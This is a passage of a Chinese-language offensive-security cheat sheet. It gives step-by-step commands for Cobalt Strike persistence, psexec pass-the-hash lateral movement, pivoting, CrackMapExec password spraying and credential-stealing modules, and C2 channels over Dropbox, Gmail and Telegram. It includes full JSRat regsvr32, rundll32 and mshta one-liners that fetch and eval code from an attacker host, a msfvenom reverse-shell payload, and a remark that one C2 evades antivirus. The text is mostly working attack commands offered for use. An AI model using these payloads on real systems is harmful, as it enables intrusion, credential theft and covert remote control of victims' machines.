--ignore-certificate-errors --proxy-server=服务器IP:端口\n访问网址\n</code></pre>\n<h2 id=\"-412\"><a class=\"anchor\" href=\"#-412\">#</a> </h2>\n<h2 id=\"权限维持\"><a class=\"anchor\" href=\"#权限维持\">#</a> 权限维持</h2>\n<pre><code>https://github.com/DeEpinGh0st/Erebus\n加载 cna 脚本\nCobalt Strike → Script Manager → Load → Erebus 中的 Main.cna\n生成 Payload\nAttacks → Packages→ Windows Executable(S)\nErebus → Persistence选择维持方法\n</code></pre>\n<h2 id=\"-413\"><a class=\"anchor\" href=\"#-413\">#</a> </h2>\n<h2 id=\"横向-2\"><a class=\"anchor\" href=\"#横向-2\">#</a> 横向</h2>\n<pre><code>扫描存活主机\n&gt;portscan ip/网段 ports端口 扫描协议(arp、icmp、none) 线程\n&gt;portscan 192.168.1.0/24 445 arp 100\n或右键目标&gt;扫描\n点击工具栏的View–&gt;Targets，查看端口探测后的存活主机。（Targets可自行添加）\nLogin-&gt;psexec进行hash传递登录\n</code></pre>\n<h2 id=\"-414\"><a class=\"anchor\" href=\"#-414\">#</a> </h2>\n<h2 id=\"隔离网络\"><a class=\"anchor\" href=\"#隔离网络\">#</a> 隔离网络</h2>\n<h2 id=\"-415\"><a class=\"anchor\" href=\"#-415\">#</a> </h2>\n<h3 id=\"权限机中转\"><a class=\"anchor\" href=\"#权限机中转\">#</a> 权限机中转</h3>\n<pre><code>Pivoting -&gt;Listener新建一条已有权限机器的监听器\n</code></pre>\n<p><img data-src=\"233.png\" alt=\"\" /><br />\n<img data-src=\"234.png\" alt=\"\" /><br />\n<img data-src=\"235.png\" alt=\"\" /></p>\n<pre><code>选择 Attacks-&gt;Packages-&gt;Windows Executable(Stageless) \n</code></pre>\n<p><img data-src=\"236.png\" alt=\"\" /></p>\n<pre><code>上传生成的payload到已上线的目标机中，上传PsExec.exe\nbeacon&gt;shell C:\\psexec.exe -accepteula \\\\10.1.1.105 -u administrator -p xxx -d -c C:\\beacon.exe\n</code></pre>\n<p><img data-src=\"237.png\" alt=\"\" /></p>\n<h2 id=\"-416\"><a class=\"anchor\" href=\"#-416\">#</a> </h2>\n<h3 id=\"smb_beacon\"><a class=\"anchor\" href=\"#smb_beacon\">#</a> SMB_beacon</h3>\n<pre><code>新建监听器(bind)windows/beacon_smb/bind_pipe\n执行\n&gt;psexec 机器名 ADMIN$/c$ bind\n</code></pre>\n<h2 id=\"-417\"><a class=\"anchor\" href=\"#-417\">#</a> </h2>\n<h3 id=\"ssh-login\"><a class=\"anchor\" href=\"#ssh-login\">#</a> SSH login</h3>\n<pre><code>&gt;ssh 10.1.1.98:22 root admin\n</code></pre>\n<p><img data-src=\"238.png\" alt=\"\" /></p>\n<h2 id=\"-418\"><a class=\"anchor\" href=\"#-418\">#</a> </h2>\n<h2 id=\"代理\"><a class=\"anchor\" href=\"#代理\">#</a> 代理</h2>\n<pre><code>&gt;socks 690\n视图-&gt;代理信息-tunnel 直接复制，粘贴到MSF中\n</code></pre>\n<h2 id=\"-419\"><a class=\"anchor\" href=\"#-419\">#</a> </h2>\n<h2 id=\"部署vpn\"><a class=\"anchor\" href=\"#部署vpn\">#</a> 部署 VPN</h2>\n<p><img data-src=\"239.png\" alt=\"\" /></p>\n<pre><code>选择内网网卡\n</code></pre>\n<p><img data-src=\"240.png\" alt=\"\" /><br />\n<img data-src=\"241.png\" alt=\"\" /><br />\n<img data-src=\"242.png\" alt=\"\" /></p>\n<pre><code>添加\n</code></pre>\n<p><img data-src=\"243.png\" alt=\"\" /><br />\n<img data-src=\"244.png\" alt=\"\" /><br />\n<img data-src=\"245.png\" alt=\"\" /></p>\n<pre><code>删除\n</code></pre>\n<p><img data-src=\"246.png\" alt=\"\" /></p>\n<h2 id=\"-420\"><a class=\"anchor\" href=\"#-420\">#</a> </h2>\n<h2 id=\"cobalt-strike派生-empire和msf\"><a class=\"anchor\" href=\"#cobalt-strike派生-empire和msf\">#</a> Cobalt strike 派生 Empire 和 MSF</h2>\n<h2 id=\"-421\"><a class=\"anchor\" href=\"#-421\">#</a> </h2>\n<h3 id=\"派生empire-2\"><a class=\"anchor\" href=\"#派生empire-2\">#</a> 派生 Empire</h3>\n<pre><code>创建一个Listener\n创建一个stager\n&gt;usestager windows/shellcode 执行，会生成/tmp/launcher.bin\nCS 使用PS命令查找进程，进行进程注入(&gt;shinject 进程id x64)，选择launcher.bin即可\n</code></pre>\n<h2 id=\"-422\"><a class=\"anchor\" href=\"#-422\">#</a> </h2>\n<h3 id=\"派生msf-2\"><a class=\"anchor\" href=\"#派生msf-2\">#</a> 派生 MSF</h3>\n<pre><code>使用CS的外部监听器\nwindows/foreign/reverse_dns_txt\nwindows/foreign/reverse_http\nwindows/foreign/reverse_https\nwindows/foreign/reverse_tcp\nmsf开启监听\ncobalt strike会话主机上点击spwan，创建外部监听器，选择windows/foreign/reverse_tcp指定MSF监听的IP和端口即可\n</code></pre>\n<h3 id=\"jsrat-2\"><a class=\"anchor\" href=\"#jsrat-2\">#</a> JSRat</h3>\n<pre><code>https://github.com/Hood3dRob1n/JSRat-Py\nhttps://github.com/Ridter/MyJSRat\n启动\n&gt;python JSRat.py -i 192.168.0.107 -p 1234\nMyJSRat可以-c参数指定执行的命令\n</code></pre>\n<p><img data-src=\"247.png\" alt=\"\" /></p>\n<pre><code>/connect是回连地址，/wtf是执行代码\n</code></pre>\n<p><img data-src=\"248.png\" alt=\"\" /></p>\n<pre><code>直接在靶机执行\n</code></pre>\n<p><img data-src=\"249.png\" alt=\"\" /></p>\n<pre><code>或\n&gt;regsvr32.exe /u /n /s /i:http://192.168.0.107:1234/file.sct scrobj.dll\nJSRat显示上线\n</code></pre>\n<p><img data-src=\"250.png\" alt=\"\" /><br />\n<img data-src=\"251.png\" alt=\"\" /></p>\n<pre><code>Wsc方式\n</code></pre>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token prolog\">&lt;?xml version=\"1.0\"?></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>package</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>component</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>testCalc<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">language</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>JScript<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token cdata\">&lt;![CDATA[</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        rat=\"rundll32.exe javascript:\\\"\\\\..\\\\mshtml,RunHTMLApplication \\\";document.write();h=new%20ActiveXObject(\\\"WinHttp.WinHttpRequest.5.1\\\");w=new%20ActiveXObject(\\\"WScript.Shell\\\");try&#123;v=w.RegRead(\\\"HKCU\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Internet%20Settings\\\\\\\\ProxyServer\\\");q=v.split(\\\"=\\\")[1].split(\\\";\\\")[0];h.SetProxy(2,q);&#125;catch(e)&#123;&#125;h.Open(\\\"GET\\\",\\\"http://192.168.0.107:1234/connect\\\",false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new%20ActiveXObject(\\\"WScript.Shell\\\").Run(\\\"cmd /c taskkill /f /im rundll32.exe\\\",0,true);&#125;\";</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        new ActiveXObject(\"WScript.Shell\").Run(rat,0,true);</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>]]></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>component</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>package</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><pre><code>&gt;rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();GetObject(&quot;script:http://192.168.0.107/jsrat.wsc&quot;)\nMshta方式\n&gt;mshta javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://192.168.0.107:1234/connect&quot;,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im mshta.exe&quot;,0,true);&#125;\n</code></pre>\n<h3 id=\"crackmapexec\"><a class=\"anchor\" href=\"#crackmapexec\">#</a> CrackMapExec</h3>\n<h2 id=\"-423\"><a class=\"anchor\" href=\"#-423\">#</a> </h2>\n<h2 id=\"信息收集-2\"><a class=\"anchor\" href=\"#信息收集-2\">#</a> 信息收集</h2>\n<pre><code>返回活动主机\n&gt;crackmapexec smb 192.168.0.0/24\n</code></pre>\n<p><img data-src=\"252.png\" alt=\"\" /></p>\n<h2 id=\"-424\"><a class=\"anchor\" href=\"#-424\">#</a> </h2>\n<h2 id=\"爆破-2\"><a class=\"anchor\" href=\"#爆破-2\">#</a> 爆破</h2>\n<pre><code>支持协议ssh,smb,winrm,mssql,http\n爆破smb协议，两台机器，一个用户名多个密码\n&gt;crackmapexec smb 192.168.0.98 192.168.0.55 -u username1 -p password1 password2\n&gt;crackmapexec smb 192.168.0.0/24 -d zone.com -u y -p 'password' --shares\n</code></pre>\n<p><img data-src=\"253.png\" alt=\"\" /></p>\n<pre><code>密码喷射\n&gt;crackmapexec &lt;protocol&gt; &lt;target(s)&gt; -u username1 username2 -p password1\n指定字典\n&gt;crackmapexec &lt;protocol&gt; &lt;target(s)&gt; -u /tmp/user.txt -p /tmp/pass.txt\nHash爆破\n&gt;crackmapexec &lt;protocol&gt; &lt;target(s)&gt; -u /tmp/user.txt -H /tmp/ntlm.txt\n</code></pre>\n<h2 id=\"-425\"><a class=\"anchor\" href=\"#-425\">#</a> </h2>\n<h2 id=\"可用模块\"><a class=\"anchor\" href=\"#可用模块\">#</a> 可用模块</h2>\n<pre><code>日志的保存位置\n~/.cme/logs\n查看协议可用后续模块\n&gt;crackmapexec smb -L\n</code></pre>\n<p><img data-src=\"254.png\" alt=\"\" /></p>\n<pre><code>常用的模块\nGet-ComputerDetails获取计算机信息\nBloodhound 执行一个BloodHound脚本获取信息\nempire_exec 与empire交互\nenum_avproducts 列举AV产品\nenum_chrome 获取目标chrome中保存的密码\nget_keystrokes 键盘记录\nget_netdomaincontroller 列出所有域控制器\nget_netrdpsession 列出活动的RDP会话\ngpp_autologin 从域控中registry.xml查找自动登录的账户密码\ngpp_password 组策略凭据中返回GPP密码\ninvoke_sessiongopher 保存putty,winscp,filezilla,superputty rdp的session\ninvoke_vnc 注入一个vnc客户端到内存\nmet_inject 与msf交互\nmimikatz 调用mimikatz模块\nmimikatz_enum_chrome 使用mimikatz解密chrome保存的密码\nmimikatz_enum_vault_creds 解密windows凭据管理器中保存的密码\nmimikittenz 执行咪咪猫(windows密码获取软件)\nmultirdp 允许多用户登录RDP\nnetripper 通过API hooking截取平常\npe_inject DLL/EXE注入\nrdp 开启或关闭RDP\nshellcode_inject 注入shellcode\ntokens 列举可用token\nuac 查看UAC是否开启\nwdigest 开启或关闭wdigest\nweb_delivery 执行exploit/multi/script/web_delivery模块\n查看模块的选项\n&gt;crackmapexec smb -M module --options\n</code></pre>\n<p><img data-src=\"255.png\" alt=\"\" /></p>\n<pre><code>使用方式\n&gt;crackmapexec smb &lt;target(s)&gt; -u user -p 'P@ssw0rd' -M module -o 参数=值\n</code></pre>\n<p><img data-src=\"256.png\" alt=\"\" /></p>\n<h2 id=\"-426\"><a class=\"anchor\" href=\"#-426\">#</a> </h2>\n<h2 id=\"pth\"><a class=\"anchor\" href=\"#pth\">#</a> PTH</h2>\n<pre><code>&gt;crackmapexec smb &lt;target(s)&gt; -u username -H LMHASH:NTHASH\n&gt;crackmapexec smb &lt;target(s)&gt; -u username -H NTHASH\n</code></pre>\n<h2 id=\"-427\"><a class=\"anchor\" href=\"#-427\">#</a> </h2>\n<h2 id=\"执行命令-2\"><a class=\"anchor\" href=\"#执行命令-2\">#</a> 执行命令</h2>\n<pre><code>&gt;crackmapexec smb 192.168.0.98 -u y -p 'qwe12323' -x 'command'\n</code></pre>\n<p><img data-src=\"257.png\" alt=\"\" /></p>\n<pre><code>-X执行powershell命令\n&gt;crackmapexec smb 192.168.0.98 -u y -p 'qwe12323' -X 'POWESHELL'\n</code></pre>\n<h3 id=\"koadic\"><a class=\"anchor\" href=\"#koadic\">#</a> koadic</h3>\n<pre><code>https://github.com/zerosum0x0/koadic\n&gt;git clone https://github.com/zerosum0x0/koadic.git\n&gt;cd koadic\n&gt;pip3 install -r requirements.txt\n&gt;./koadic\n</code></pre>\n<h3 id=\"silenttrinity\"><a class=\"anchor\" href=\"#silenttrinity\">#</a> SILENTTRINITY</h3>\n<pre><code>https://github.com/byt3bl33d3r/SILENTTRINITY\n类似cobalt strike+empire的结合\n&gt;git clone https://github.com/byt3bl33d3r/SILENTTRINITY\n&gt;pip3 install --user pipenv &amp;&amp; pipenv install &amp;&amp; pipenv shell\n&gt;python st.py\n服务端执行\n&gt;python3 st.py teamserver &lt;teamserver_ip&gt; &lt;teamserver_password&gt;\n&gt;python3 st.py teamserver 192.168.0.108 123456\n也可加参数--port指定端口\n</code></pre>\n<p><img data-src=\"258.png\" alt=\"\" /></p>\n<pre><code>客户端执行\n&gt;python3 st.py client wss://&lt;username&gt;:&lt;teamserver_password&gt;@&lt;teamserver_ip&gt;:5000\n&gt;python3 st.py client wss://y:123456@192.168.0.108:5000\n</code></pre>\n<p><img data-src=\"259.png\" alt=\"\" /></p>\n<pre><code>&gt;listeners命令进入监听器目录\n&gt;use http选择监听器\n&gt;options命令查看需要配置的参数\n</code></pre>\n<p><img data-src=\"260.png\" alt=\"\" /></p>\n<pre><code>&gt;set Port 8081 使用set命令配置参数\n&gt;start 启动监听器\n&gt;list查看运行中的监听器\n</code></pre>\n<p><img data-src=\"261.png\" alt=\"\" /></p>\n<pre><code>&gt;stop http使用stop+监听器名字停止监听器\n&gt;stagers进入payload目录\n&gt;list列出可用payload\n</code></pre>\n<p><img data-src=\"262.png\" alt=\"\" /></p>\n<pre><code>&gt;use payloadname 命令use+payload名字\n&gt;generate http generate+监听器名字生成payload\n</code></pre>\n<p><img data-src=\"263.png\" alt=\"\" /></p>\n<h3 id=\"browser-c2\"><a class=\"anchor\" href=\"#browser-c2\">#</a> Browser C2</h3>\n<pre><code>360全套+火绒没有拦截\n缺点:会有黑框，并且打开chrome浏览器，功能限制\nhttps://github.com/0x09AL/Browser-C2\n&gt;go get -u github.com/gorilla/mux\n&gt;go get -u github.com/chzyer/readline\n&gt;git clone https://github.com/0x09AL/Browser-C2.git\n/Browser-C2/agent/agent.go修改C2地址\n</code></pre>\n<p><img data-src=\"264.png\" alt=\"\" /></p>\n<pre><code>修改chrome的位置\n</code></pre>\n<p><img data-src=\"265.png\" alt=\"\" /></p>\n<pre><code>编译客户端\n&gt;CGO_ENABLED=1 GOARCH= GOOS=windows go build\n</code></pre>\n<p><img data-src=\"266.png\" alt=\"\" /></p>\n<pre><code> /Browser-C2/static/jquery.js修改控制服务器IP\n</code></pre>\n<p><img data-src=\"267.png\" alt=\"\" /></p>\n<pre><code>转到主目录编译服务器端\n&gt;go build\n靶机执行生成好的客户端\n攻击机监听\n</code></pre>\n<p><img data-src=\"268.png\" alt=\"\" /></p>\n<pre><code>此框架与靶机之间通信未加密，功能有限，可与msf、cs、poshc2、empire等框架建立联系。\n</code></pre>\n<h3 id=\"dropbox-c2\"><a class=\"anchor\" href=\"#dropbox-c2\">#</a> DropBox C2</h3>\n<pre><code>&gt;git clone https://github.com/Arno0x/DBC2 dbc2\n&gt;cd dbc2\n&gt;pip install -r requirements.txt\n&gt;chmod +x dropboxC2.py\nhttps://www.dropbox.com/developers/apps/create\n创建好后要生成个accesstoken，填入config.py中\n</code></pre>\n<p><img data-src=\"269.png\" alt=\"\" /></p>\n<pre><code>执行\n</code></pre>\n<p><img data-src=\"270.png\" alt=\"\" /></p>\n<pre><code>这里需设置一个与受控机交互的加密密码\n发布agent\n&gt;publishStage dbc2_agent.exe\n使用命令listPublishedStage可以看到已发布的agent\n</code></pre>\n<p><img data-src=\"271.png\" alt=\"\" /></p>\n<pre><code>生成payload\n&gt;genStager [tab]查看可生成的格式\n</code></pre>\n<p><img data-src=\"272.png\" alt=\"\" /></p>\n<pre><code>&gt;genStager oneliner default生成powershell格式payload\n</code></pre>\n<p><img data-src=\"273.png\" alt=\"\" /></p>\n<pre><code>&gt;genStager batch default生成bat格式\n</code></pre>\n<p><img data-src=\"274.png\" alt=\"\" /></p>\n<pre><code>Msbuild，其余不做演示\n</code></pre>\n<p><img data-src=\"275.png\" alt=\"\" /></p>\n<pre><code>这里使用powershell格式的，在受控机运行\n</code></pre>\n<p><img data-src=\"276.png\" alt=\"\" /></p>\n<pre><code>攻击机可以看到上线\n</code></pre>\n<p><img data-src=\"277.png\" alt=\"\" /></p>\n<pre><code>&gt;list命令可以看到已控机器\n</code></pre>\n<p><img data-src=\"278.png\" alt=\"\" /></p>\n<pre><code>使用use命令与受控机器交互\n</code></pre>\n<p><img data-src=\"279.png\" alt=\"\" /></p>\n<pre><code>输入?获得后续命令\n</code></pre>\n<p><img data-src=\"280.png\" alt=\"\" /></p>\n<h3 id=\"gmail-c2\"><a class=\"anchor\" href=\"#gmail-c2\">#</a> Gmail C2</h3>\n<h2 id=\"-428\"><a class=\"anchor\" href=\"#-428\">#</a> </h2>\n<h2 id=\"gcat\"><a class=\"anchor\" href=\"#gcat\">#</a> Gcat</h2>\n<pre><code>https://myaccount.google.com/lesssecureapps\n启用设置\n</code></pre>\n<p><img data-src=\"281.png\" alt=\"\" /></p>\n<pre><code>Gmail启用imap\n</code></pre>\n<p><img data-src=\"282.png\" alt=\"\" /></p>\n<pre><code>将以下脚本转换为exe\n# setup.py\nfrom distutils.core import setup\nimport py2exe\n\nsetup(console=['implant.py'])\nhttps://github.com/byt3bl33d3r/gcat\n把gcat项目中的implant.py跟以上脚本放在同一目录，修改implant.py中的账户信息\n</code></pre>\n<p><img data-src=\"283.png\" alt=\"\" /></p>\n<pre><code>&gt;python 1.py py2exe打包\ndist目录下生成implant.exe受控机执行\n同时也要修改项目中gcat.py中的账户信息\n</code></pre>\n<p><img data-src=\"284.png\" alt=\"\" /></p>\n<pre><code>在受控机执行implant.exe，如果报错修改email模块以下三行\nfrom email.mime.multipart import MIMEMultipart\nfrom email.mime.base import MIMEBase\nfrom email.mime.text import MIMEText\n</code></pre>\n<p><img data-src=\"285.png\" alt=\"\" /></p>\n<pre><code>执行后，邮箱会收到信息\n</code></pre>\n<p><img data-src=\"286.png\" alt=\"\" /></p>\n<pre><code>使用gcat.py也可以得到当前会话\n&gt;python gcat.py -list\n</code></pre>\n<p><img data-src=\"287.png\" alt=\"\" /></p>\n<pre><code>现在可对其进行控制\n&gt;python gcat.py -id [id] -cmd 'net user'\n</code></pre>\n<p><img data-src=\"288.png\" alt=\"\" /></p>\n<pre><code>生成jobid，指定jobid可查看回显\n</code></pre>\n<p><img data-src=\"289.png\" alt=\"\" /></p>\n<pre><code>邮箱中也存在\n</code></pre>\n<p><img data-src=\"290.png\" alt=\"\" /></p>\n<pre><code>当受控机为中文系统时，回显会报错，修改代码\n</code></pre>\n<p><img data-src=\"291.png\" alt=\"\" /></p>\n<pre><code>其他模块有回显的直接修改后重新py2exe打包即可。\n支持的功能:cmd,upload/download,执行shellcode,键盘记录,截屏等\n</code></pre>\n<h2 id=\"-429\"><a class=\"anchor\" href=\"#-429\">#</a> </h2>\n<h2 id=\"gdog\"><a class=\"anchor\" href=\"#gdog\">#</a> Gdog</h2>\n<pre><code>https://github.com/maldevel/gdog\n功能更多:\n加密传输、地理位置、执行命令、上传下载、shellcode、截图、键盘记录、关闭重启、注销用户、从web下载、访问网站等\n配置流程基本一样，需要打包exe，但是要安装一些模块PyCrypto、WMI、Enum34、Netifaces\n# setup.py\nfrom distutils.core import setup\nimport py2exe\n \nsetup(console=['client.py'])\nclient.py在回显处也要添加decode gbk\n执行client.exe报超出索引错误时\n在client.py中搜索字符串for iface in netifaces.interfaces():\n在它下面一行修改为\nif netifaces.ifaddresses(iface)[netifaces.AF_LINK][0]['addr'] == self.MAC and netifaces.AF_INET in netifaces.ifaddresses(iface):\n打包好后执行\n</code></pre>\n<p><img data-src=\"292.png\" alt=\"\" /><br />\n<img data-src=\"293.png\" alt=\"\" /><br />\n<img data-src=\"294.png\" alt=\"\" /><br />\n<img data-src=\"295.png\" alt=\"\" /></p>\n<pre><code>提取jobid回显出错的话，添加\nreload(sys)\nsys.setdefaultencoding(&quot;utf-8&quot;)\n执行shellcode\n&gt;msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform Windows EXITFUNC=thread LPORT=4444 LHOST=x.x.x.x -f python\n去除引号加减号，只保留shellcode粘贴到文件shell.txt\n&gt;python gdog.py -id &#123;id&#125; -exec-shellcode /tmp/shell.txt\n</code></pre>\n<h3 id=\"telegram-c2\"><a class=\"anchor\" href=\"#telegram-c2\">#</a> Telegram C2</h3>\n<pre><code>登录telegram\n访问https://telegram.me/botfather，发送消息\n</code></pre>\n<p><img data-src=\"296.png\" alt=\"\" /></p>\n<pre><code>创建一个bot\n</code></pre>\n<p><img data-src=\"297.png\" alt=\"\" /></p>\n<pre><code>创建完成后返回一个token\n&gt;pip install telepot\n&gt;pip install requests\n&gt;git clone https://github.com/blazeinfosec/bt2.git\n编辑bt2.py\n粘贴token和chatid进脚本\nChat_id的获取方式\nhttps://api.telegram.org/bot&lt;token&gt;/getUpdates\n</code></pre>\n<p><img data-src=\"298.png\" alt=\"\" /><br />\n<img data-src=\"299.png\" alt=\"\" /></p>\n<pre><code>当有受控机上线时会列出功能\n</code></pre>\n<p><img data-src=\"300.png\" alt=\"\" /><br />\n<img data-src=\"301.png\" alt=\"\" /></p>\n<pre><code>Windows\nhttps://github.com/sf197/Telegra_Csharp_C2\n</code></pre>\n<h2 id=\"信息收集-3\"><a class=\"anchor\" href=\"#信息收集-3\">#</a> 信息收集</h2>\n<h3 id=\"cmd\"><a class=\"anchor\" href=\"#cmd\">#</a> Cmd</h3>\n<pre><code>&gt;whoami /user 查看当前用户SID\n&gt;net config Workstation 查看当前计算机信息\n&gt;net time /domain 判断主域\n错误5：存在域，当前不是域用户\n显示时间：存在域，当前是域内用户\n找不到域：不存在\n&gt;net view /domain 列出域列表\n&gt;net group &quot;Domain Controllers&quot; /domain查看主域控\n&gt;nltest /DCLIST:zone.com 查看域控\n&gt;net group &quot;domain admins&quot; /domain 查看域管理员\n&gt;net group &quot;enterprise admins&quot; /domain 查看企业管理员列表\n&gt;net localgroup administrators /domain 查看管理组用户\n&gt;net group &quot;domain computers&quot; /domain 查看域成员计算机\n&gt;net accounts /domain 查看密码策略\n&gt;net user /domain查看域内用户\n&gt;net view /domain:dc 查询域内计算机\n&gt;netsh firewall set opmode disable/enable 关闭windows防火墙(win2003)\n&gt;netsh advfirewall set allprofiles state off/on(大于win2003)\n&gt;arp -a查看arp表\n&gt;net start 查看服务\n&gt;route print查看路由表\n&gt;query user查看登录机器的用户的连接状态\n&gt;tasklist /v 查看域管理员进程\n&gt;dsquery server查询域控制器\n&gt;dsquery computer 查询域内机器\n&gt;dsquery user 查询域用户\n&gt;dsquery ou 域内组织单位\n导出域DNS记录，文件保存在C:\\Windows\\System32\\dns\\\n&gt;dnscmd /zoneexport zone.com 1.txt\n导出LDAP数据库\n&gt;LDIFDE -f c:\\windows\\temp\\dump.ldf -n -m\n</code></pre>\n<h3 id=\"wmi-2\"><a class=\"anchor\" href=\"#wmi-2\">#</a> Wmi</h3>\n<pre><code>&gt;wmic OS get Caption,CSDVersion,OSArchitecture,Version系统版本\n&gt;wmic service list brief 列出本机服务\n&gt;wmic process list brief 列出进程\n&gt;wmic process where name=&quot;chrome.exe&quot; get executablepath进程路径\n&gt;wmic process get caption,commandline /value&gt;&gt;1.txt查询所有进程参数\n&gt;wmic process where caption=&quot;svchost.exe&quot; get caption,commandline /value 查询某个进程命令行参数\n创建进程\n&gt;wmic process call create calc\n&gt;wmic process call create &quot;C:\\shell.exe&quot;\n&gt;wmic process call create &quot;shutdown.exe -r -f -t 20&quot;\n结束进程\n&gt;wmic process where name=&quot;shell.exe&quot; call terminate\n&gt;wmic process where processid=&quot;2345&quot; delete\n&gt;wmic process 2345 call terminate\n&gt;wmic startup list brief 列出自启动程序\n&gt;wmic /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List 查看杀毒软件\n&gt;wmic netuse list brief 列出共享驱动盘\n&gt;wmic ntdomain list brief 查询域控制器\n&gt;wmic useraccount list brief 列出本机管理员及SID\n&gt;wmic qfe list brief 列出补丁列表\n&gt;wmic share get name,path 查看共享\n&gt;wmic startup list brief查看启动项\n&gt;wmic product get name,version 查看安装的软件\n&gt;wmic product where &quot;name like '%360%'&quot; get name 查看程序名\n&gt;wmic product where name=&quot;360tray&quot; call uninstall 卸载程序\n&gt;wmic process where &quot;name like '%360%'&quot; get name 查找进程全名\n&gt;wmic product where name=&quot;360tray.exe&quot; call terminate 停止程序\n&gt;wmic desktop get screensaversecure,screensavertimeout 查看屏保\n</code></pre>\n<h3 id=\"powerview\"><a class=\"anchor\" href=\"#powerview\">#</a> PowerView</h3>\n<pre><code>获取域信息\n&gt;powershell -exec bypass -Command &quot;&amp;&#123;Import-Module .\\powerview.ps1; Get-NetDomain&#125;&quot;\n</code></pre>\n<p><img data-src=\"302.png\" alt=\"\" /></p>\n<pre><code>&gt;powershell -exec bypass -Command &quot;&amp;&#123;Import-Module .\\powerview.ps1; get-netforest&#125;&quot;\n</code></pre>\n<p><img data-src=\"303.png\" alt=\"\" /></p>\n<pre><code>枚举管理员\n&gt;powershell -exec bypass -Command &quot;&amp;&#123;Import-Module .\\powerview.ps1; Invoke-EnumerateLocalAdmin&#125;&quot;\n</code></pre>\n<p><img data-src=\"304.png\" alt=\"\" /></p>\n<pre><code>查询管理在线的机器\n&gt;powershell -exec bypass -Command &quot;&amp;&#123;Import-Module .\\powerview.ps1; invoke-userhunter&#125;&quot;\n</code></pre>\n<p><img data-src=\"305.png\" alt=\"\" /></p>\n<pre><code>查看域内机器以administrator权限运行的进程\n&gt;powershell -exec bypass -Command &quot;&amp;&#123;Import-Module .\\powerview.ps1; invoke-processhunter &#125;&quot;\n</code></pre>\n<p><img data-src=\"306.png\" alt=\"\" /></p>\n<pre><code>或指定参数userfile和computerfile查询某台机器某个用户的进程\n&gt;powershell -exec bypass -Command &quot;&amp;&#123;Import-Module .\\powerview.ps1; invoke-processhunter -Userfile .\\user.txt -computerfile .\\host.txt&#125;&quot;\n</code></pre>\n<p><img data-src=\"307.png\" alt=\"\" /></p>\n<pre><code>查询域内机器共享\n&gt;powershell -exec bypass -Command &quot;&amp;&#123;Import-Module .\\powerview.ps1; Invoke-sharefinder&#125;&quot;\n</code></pre>\n<p><img data-src=\"308.png\" alt=\"\" /></p>\n<pre><code>查询域内机器\n&gt;Get-NetComputer -Domain zone.com\n</code></pre>\n<p><img data-src=\"309.png\" alt=\"\" /></p>\n<pre><code>&gt;Find-LocalAdminAccess -verbose 查询域内本地用户能登录的机器\n</code></pre>\n<p><img data-src=\"310.png\" alt=\"\" /></p>\n<pre><code>Dev-powerview\n获取域控机器和win版本\n&gt;Get-DomainController |select name,osversion|fl \n</code></pre>\n<h3 id=\"linux-4\"><a class=\"anchor\" href=\"#linux-4\">#</a> Linux</h3>\n<pre><code>操作系统&amp;内核版本&amp;环境变量\n&gt;cat /etc/issue\n&gt;cat /etc/*-release\n&gt;cat /etc/lsb-release\n&gt;cat /etc/redhat-release\ncat /proc/version\n&gt;uname -a\n&gt;uname -mrs\n&gt;rpm -q kernel\n&gt;dmesg | grep Linux\n&gt;ls /boot | grep vmlinuz-\n&gt;cat /etc/profile\n&gt;cat /etc/bashrc\n&gt;cat ~/.bash_profile\n&gt;cat ~/.bashrc\n&gt;cat ~/.bash_logout\n&gt;env\n&gt;set\nRoot权限进程\n&gt;ps aux | grep root\n&gt;ps -ef | grep root\n计划任务\n&gt;crontab -l\n&gt;ls -alh /var/spool/cron\n&gt;ls -al /etc/ | grep cron\n&gt;ls -al /etc/cron*\n&gt;cat /etc/cron*\n&gt;cat /etc/at.allow\n&gt;cat /etc/at.deny\n&gt;cat /etc/cron.allow\n&gt;cat /etc/cron.deny\n&gt;cat /etc/crontab\n&gt;cat /etc/anacrontab\n&gt;cat /var/spool/cron/crontabs/root\nIP信息\n&gt;/sbin/ifconfig -a\n&gt;cat /etc/network/interfaces\n&gt;cat /etc/sysconfig/network\n连接信息\n&gt;grep 80 /etc/services\n&gt;netstat 